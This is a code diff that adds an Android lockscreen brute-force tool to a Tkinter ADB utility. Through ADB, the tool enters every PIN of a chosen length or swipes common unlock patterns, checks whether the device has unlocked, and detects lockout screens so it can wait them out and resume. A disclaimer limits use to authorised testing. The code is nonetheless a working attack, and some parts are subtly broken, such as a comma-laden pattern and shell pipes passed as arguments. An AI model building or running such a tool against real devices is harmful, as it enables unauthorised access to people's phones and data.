@@ -8,6 +8,7 @@ from tkinter import ttk, messagebox, scrolledtext
 import subprocess
 import threading
 import logging
+import time
 
 from ..constants import IS_WINDOWS
 
@@ -127,6 +128,448 @@ class SecurityMixin:
         except Exception as e:
             self.log_message(f"Error checking lock screen status: {str(e)}")
             messagebox.showerror("Error", f"Failed to check lock screen status: {str(e)}")
+
+    def run_screen_lock_brute_forcer(self):
+        """Launch the screen lock brute force testing utility
+
+        This tool attempts to unlock an Android device's lockscreen by trying
+        different PIN combinations or pattern sequences.
+        """
+        self.log_message("Starting Screen Lock Brute Forcer...")
+
+        # Check if a device is connected
+        if not hasattr(self, 'device_serial') or not self.device_serial:
+            self.log_message("No device connected. Please connect a device first.")
+            return
+
+        # Create dialog to configure the brute force attack
+        config_dialog = tk.Toplevel(self)
+        config_dialog.title("Screen Lock Brute Forcer")
+        config_dialog.geometry("750x850")
+        config_dialog.resizable(False, False)
+        config_dialog.transient(self)  # Set to be on top of the main window
+        config_dialog.grab_set()  # Make the dialog modal
+
+        # Add some padding
+        padframe = ttk.Frame(config_dialog, padding="10 10 10 10")
+        padframe.pack(fill=tk.BOTH, expand=True)
+
+        # Create form elements
+        ttk.Label(padframe, text="Lock Type:").grid(row=0, column=0, sticky="w", pady=5)
+        lock_type = tk.StringVar(value="pin")
+        ttk.Radiobutton(padframe, text="PIN", variable=lock_type, value="pin").grid(row=0, column=1, sticky="w")
+        ttk.Radiobutton(padframe, text="Pattern", variable=lock_type, value="pattern").grid(row=0, column=2, sticky="w")
+
+        ttk.Label(padframe, text="PIN Length:").grid(row=1, column=0, sticky="w", pady=5)
+        pin_length = tk.StringVar(value="4")
+        pin_combo = ttk.Combobox(padframe, textvariable=pin_length, values=["4", "5", "6"], width=5)
+        pin_combo.grid(row=1, column=1, sticky="w", columnspan=2)
+
+        ttk.Label(padframe, text="Start Value (optional):").grid(row=2, column=0, sticky="w", pady=5)
+        start_value = tk.StringVar()
+        ttk.Entry(padframe, textvariable=start_value, width=10).grid(row=2, column=1, sticky="w", columnspan=2)
+
+        ttk.Label(padframe, text="Delay Between Attempts (ms):").grid(row=3, column=0, sticky="w", pady=5)
+        delay_ms = tk.StringVar(value="500")
+        ttk.Entry(padframe, textvariable=delay_ms, width=10).grid(row=3, column=1, sticky="w", columnspan=2)
+
+        # Add a separator
+        ttk.Separator(padframe, orient="horizontal").grid(row=4, column=0, columnspan=3, sticky="ew", pady=10)
+
+        # Add warning
+        warning_text = (
+            "WARNING: This tool is for educational and security testing purposes only. "
+            "Using this on devices without authorization is illegal and unethical. "
+            "Always obtain explicit permission before testing any device."
+        )
+
+        warning_label = ttk.Label(padframe, text=warning_text, wraplength=380)
+        warning_label.grid(row=5, column=0, columnspan=3, sticky="ew", pady=10)
+        warning_label.config(foreground="red")
+
+        # Add log frame
+        log_frame = ttk.LabelFrame(padframe, text="Log")
+        log_frame.grid(row=6, column=0, columnspan=3, sticky="nsew", pady=5)
+        padframe.grid_rowconfigure(6, weight=1)
+
+        # Add scrolled text widget for log
+        log_text = scrolledtext.ScrolledText(log_frame, height=5, width=40, state="disabled")
+        log_text.pack(fill="both", expand=True, padx=5, pady=5)
+
+        # Function to add log messages
+        def add_log(message):
+            log_text.config(state="normal")
+            log_text.insert(tk.END, f"{message}\n")
+            log_text.see(tk.END)
+            log_text.config(state="disabled")
+
+        # Add start/stop button frame
+        btn_frame = ttk.Frame(padframe)
+        btn_frame.grid(row=7, column=0, columnspan=3, pady=10)
+
+        # Variable to control the brute force process
+        running = [False]  # Use a list to allow modification from nested functions
+
+        # We'll create the buttons after defining their functions
+
+        # Start button function
+        def start_brute_force():
+            if running[0]:
+                return  # Already running
+
+            try:
+                # Validate inputs
+                try:
+                    pin_len = int(pin_length.get())
+                    if pin_len < 3 or pin_len > 8:
+                        add_log("Invalid PIN length. Must be between 3 and 8 digits.")
+                        return
+                except ValueError:
+                    add_log("PIN length must be a number.")
+                    return
+
+                try:
+                    delay = int(delay_ms.get())
+                    if delay < 100:
+                        add_log("WARNING: Very small delay might cause device instability.")
+                except ValueError:
+                    add_log("Delay must be a number.")
+                    return
+
+                # Get start value if specified
+                start = 0
+                if start_value.get().strip():
+                    try:
+                        start = int(start_value.get().strip())
+                    except ValueError:
+                        add_log("Start value must be a number.")
+                        return
+
+                # Start the actual brute force in a separate thread
+                running[0] = True
+                start_btn.config(state="disabled")
+                stop_btn.config(state="normal")
+                add_log(f"Starting {'PIN' if lock_type.get() == 'pin' else 'Pattern'} brute force...")
+
+                thread = threading.Thread(
+                    target=lambda: self._run_screen_lock_brute_force(
+                        lock_type.get(), pin_len, start, delay,
+                        add_log, lambda: running[0],
+                        lambda: threading.current_thread().setName('Finished')),
+                    daemon=True
+                )
+                thread.start()
+
+                # Check thread status periodically
+                def check_thread():
+                    if not thread.is_alive() or not running[0]:
+                        start_btn.config(state="normal")
+                        stop_btn.config(state="disabled")
+                        running[0] = False
+                        add_log("Brute force operation completed or stopped.")
+                    else:
+                        # Check again in 500ms
+                        config_dialog.after(500, check_thread)
+
+                config_dialog.after(500, check_thread)
+
+            except Exception as e:
+                add_log(f"Error: {str(e)}")
+                running[0] = False
+                start_btn.config(state="normal")
+                stop_btn.config(state="disabled")
+
+        # Stop button function
+        def stop_brute_force():
+            running[0] = False
+            add_log("Stopping brute force operation...")
+
+        # Add start and stop buttons with clear, descriptive labels
+        start_btn = ttk.Button(btn_frame, text="Start Brute Force", command=start_brute_force, width=15)
+        start_btn.pack(side="left", padx=5)
+
+        stop_btn = ttk.Button(btn_frame, text="Stop Brute Force", command=stop_brute_force, state="disabled", width=15)
+        stop_btn.pack(side="left", padx=5)
+
+        # Add initial log message
+        add_log("Configure the brute force parameters and click Start to begin.")
+
+    def _run_screen_lock_brute_force(self, lock_type, pin_length, start_value, delay_ms, log_callback, should_continue, on_complete):
+        """Execute the actual brute force operation"""
+        try:
+            # First wake up the device
+            self.run_adb_command(
+                ['shell', 'input', 'keyevent', 'KEYCODE_WAKEUP'],
+                device_serial=self.device_serial
+            )
+            time.sleep(1)
+
+            # Swipe up to show lock screen (for newer Android versions)
+            self.run_adb_command(
+                ['shell', 'input', 'swipe', '500', '1500', '500', '500'],
+                device_serial=self.device_serial
+            )
+            time.sleep(1)
+
+            # Check if device is actually locked
+            success, dumpsys = self.run_adb_command(
+                ['shell', 'dumpsys', 'window', '|', 'grep', 'mDreamingLockscreen'],
+                device_serial=self.device_serial
+            )
+
+            if success and 'mDreamingLockscreen=true' not in dumpsys:
+                log_callback("Device does not appear to be locked. Make sure the screen is locked first.")
+                on_complete()
+                return
+
+            # Calculate max attempts based on PIN length
+            max_attempts = 10 ** pin_length
+            log_callback(f"Maximum possible {pin_length}-digit PIN combinations: {max_attempts}")
+
+            # Start the brute force loop
+            current = start_value
+            count = 0
+
+            if lock_type == 'pin':
+                while should_continue() and current < max_attempts:
+                    # Format the PIN with leading zeros
+                    pin = str(current).zfill(pin_length)
+                    log_callback(f"Trying PIN: {pin} ({current+1-start_value}/{max_attempts-start_value} attempts)")
+
+                    # Type the PIN
+                    for digit in pin:
+                        self.run_adb_command(
+                            ['shell', 'input', 'text', digit],
+                            device_serial=self.device_serial
+                        )
+                        time.sleep(0.1)  # Small delay between digits
+
+                    # Press enter to submit
+                    self.run_adb_command(
+                        ['shell', 'input', 'keyevent', 'KEYCODE_ENTER'],
+                        device_serial=self.device_serial
+                    )
+
+                    # Increment counter and check if we should continue
+                    current += 1
+                    count += 1
+
+                    # Check if we've successfully unlocked
+                    if count % 5 == 0:  # Only check every 5 attempts to speed up process
+                        success, locked_check = self.run_adb_command(
+                            ['shell', 'dumpsys', 'window', '|', 'grep', 'mDreamingLockscreen'],
+                            device_serial=self.device_serial
+                        )
+
+                        if success and 'mDreamingLockscreen=false' in locked_check:
+                            log_callback(f"SUCCESS! Device unlocked with PIN: {pin}")
+                            break
+
+                    # Handle too many attempts lockout - detect and wait for timeout
+                    if count % 5 == 0:
+                        # First try to tap OK button if it's visible
+                        self.run_adb_command(
+                            ['shell', 'input', 'tap', '500', '1000'],  # Tap middle of screen where OK might be
+                            device_serial=self.device_serial
+                        )
+
+                        # Check if we're in a lockout state by looking for timeout text on screen
+                        success, screencap_path = self.run_adb_command(
+                            ['shell', 'screencap', '/sdcard/screen_check.png'],
+                            device_serial=self.device_serial
+                        )
+
+                        if success:
+                            # Pull the screenshot to analyze
+                            self.run_adb_command(
+                                ['pull', '/sdcard/screen_check.png', '/tmp/screen_check.png'],
+                                device_serial=self.device_serial
+                            )
+
+                            # Check for lockout state (could use OCR, but we'll use a simpler method)
+                            # Look for texts like 'try again in' by using dumpsys to check visible text
+                            success, visible_text = self.run_adb_command(
+                                ['shell', 'uiautomator', 'dump', '/sdcard/ui.xml', '&&', 'cat', '/sdcard/ui.xml', '|', 'grep', '-i', 'try again'],
+                                device_serial=self.device_serial
+                            )
+
+                            if success and visible_text:
+                                # Extract timeout period if possible (e.g., '30 seconds')
+                                import re
+                                timeout_match = re.search(r'try again.* (\d+) (second|minute)s?', visible_text.lower())
+
+                                if timeout_match:
+                                    time_value = int(timeout_match.group(1))
+                                    time_unit = timeout_match.group(2)
+
+                                    wait_seconds = time_value if time_unit == 'second' else time_value * 60
+                                    wait_seconds += 5  # Add a small buffer
+
+                                    log_callback(f"Lockout detected! Waiting {wait_seconds} seconds before resuming...")
+
+                                    # Wait in small increments to allow cancellation
+                                    for i in range(wait_seconds):
+                                        if not should_continue():
+                                            break
+                                        time.sleep(1)
+                                        if i % 5 == 0:  # Update status every 5 seconds
+                                            log_callback(f"Waiting for lockout: {wait_seconds-i} seconds remaining...")
+                                else:
+                                    # If we can't parse the exact time, wait for a default period
+                                    log_callback("Lockout detected! Waiting 60 seconds before resuming...")
+                                    for i in range(60):
+                                        if not should_continue():
+                                            break
+                                        time.sleep(1)
+                                        if i % 5 == 0:  # Update status every 5 seconds
+                                            log_callback(f"Waiting for lockout: {60-i} seconds remaining...")
+
+                            # Clean up
+                            self.run_adb_command(
+                                ['shell', 'rm', '/sdcard/screen_check.png', '/sdcard/ui.xml'],
+                                device_serial=self.device_serial
+                            )
+
+                    # Wait specified delay to avoid overloading the device
+                    time.sleep(delay_ms / 1000)
+
+            elif lock_type == 'pattern':
+                # For pattern, we'll try some common patterns
+                # Pattern uses a 3x3 grid numbered 0-8, starting from top left
+                # 0 1 2
+                # 3 4 5
+                # 6 7 8
+                common_patterns = [
+                    # Shapes
+                    "0123678",  # Z pattern
+                    "0124876",  # N pattern
+                    "01258",    # Slash
+                    "02468",    # X pattern
+                    "048",      # Diagonal
+                    "0124",     # L pattern
+                    "01236",    # C pattern
+                    # Common pattern movements
+                    "2748",     # Down-up-down
+                    "0246",     # Corners
+                    "0,1,2,5,8,7,6,3,0"  # Full circuit
+                ]
+
+                for pattern in common_patterns:
+                    if not should_continue():
+                        break
+
+                    log_callback(f"Trying pattern: {pattern}")
+
+                    # Clear any previous attempts
+                    self.run_adb_command(
+                        ['shell', 'input', 'keyevent', 'KEYCODE_ESCAPE'],
+                        device_serial=self.device_serial
+                    )
+                    time.sleep(1)
+
+                    # Swipe pattern - compute coordinates for each point
+                    # Standard pattern grid is usually 3x3 covering most of screen
+                    width, height = 1080, 1920  # Assume standard dimensions, adjust if needed
+
+                    # Define the grid coordinates (3x3 grid)
+                    grid = [
+                        (width//4, height//4),      # 0: Top left
+                        (width//2, height//4),      # 1: Top middle
+                        (3*width//4, height//4),    # 2: Top right
+                        (width//4, height//2),      # 3: Middle left
+                        (width//2, height//2),      # 4: Middle middle
+                        (3*width//4, height//2),    # 5: Middle right
+                        (width//4, 3*height//4),    # 6: Bottom left
+                        (width//2, 3*height//4),    # 7: Bottom middle
+                        (3*width//4, 3*height//4)   # 8: Bottom right
+                    ]
+
+                    # Convert pattern string to coordinates
+                    coords = []
+                    for char in pattern:
+                        if char.isdigit() and 0 <= int(char) <= 8:
+                            coords.append(grid[int(char)])
+
+                    if len(coords) >= 2:  # Need at least 2 points for a swipe
+                        # Build the swipe command with all points in pattern
+                        swipe_cmd = ['shell', 'input', 'swipe']
+                        for x, y in coords:
+                            swipe_cmd.extend([str(x), str(y)])
+
+                        # Execute the swipe
+                        self.run_adb_command(
+                            swipe_cmd,
+                            device_serial=self.device_serial
+                        )
+
+                        # Check if we've successfully unlocked
+                        time.sleep(1)
+                        success, locked_check = self.run_adb_command(
+                            ['shell', 'dumpsys', 'window', '|', 'grep', 'mDreamingLockscreen'],
+                            device_serial=self.device_serial
+                        )
+
+                        if success and 'mDreamingLockscreen=false' in locked_check:
+                            log_callback(f"SUCCESS! Device unlocked with pattern: {pattern}")
+                            break
+
+                        # Handle too many attempts lockout for pattern attempts too
+                        # Check for lockout state by looking for timeout text on screen
+                        success, visible_text = self.run_adb_command(
+                            ['shell', 'uiautomator', 'dump', '/sdcard/ui.xml', '&&', 'cat', '/sdcard/ui.xml', '|', 'grep', '-i', 'try again'],
+                            device_serial=self.device_serial
+                        )
+
+                        if success and visible_text:
+                            # Extract timeout period if possible (e.g., '30 seconds')
+                            import re
+                            timeout_match = re.search(r'try again.* (\d+) (second|minute)s?', visible_text.lower())
+
+                            if timeout_match:
+                                time_value = int(timeout_match.group(1))
+                                time_unit = timeout_match.group(2)
+
+                                wait_seconds = time_value if time_unit == 'second' else time_value * 60
+                                wait_seconds += 5  # Add a small buffer
+
+                                log_callback(f"Lockout detected! Waiting {wait_seconds} seconds before resuming...")
+
+                                # Wait in small increments to allow cancellation
+                                for i in range(wait_seconds):
+                                    if not should_continue():
+                                        break
+                                    time.sleep(1)
+                                    if i % 5 == 0:  # Update status every 5 seconds
+                                        log_callback(f"Waiting for lockout: {wait_seconds-i} seconds remaining...")
+                            else:
+                                # If we can't parse the exact time, wait for a default period
+                                log_callback("Lockout detected! Waiting 60 seconds before resuming...")
+                                for i in range(60):
+                                    if not should_continue():
+                                        break
+                                    time.sleep(1)
+                                    if i % 5 == 0:  # Update status every 5 seconds
+                                        log_callback(f"Waiting for lockout: {60-i} seconds remaining...")
+
+                            # Clean up
+                            self.run_adb_command(
+                                ['shell', 'rm', '/sdcard/ui.xml'],
+                                device_serial=self.device_serial
+                            )
+
+                        # Wait specified delay to avoid overloading the device
+                        time.sleep(delay_ms / 1000)
+
+            # If we reach here without breaking, we didn't unlock successfully
+            if should_continue():
+                log_callback("Brute force completed without finding the correct combination.")
+
+        except Exception as e:
+            log_callback(f"Error during brute force: {str(e)}")
+            import traceback
+            log_callback(traceback.format_exc())
+        finally:
+            on_complete()
 
     def _detect_lock_screen_type(self, serial):
         """Detect the type of lock screen"""
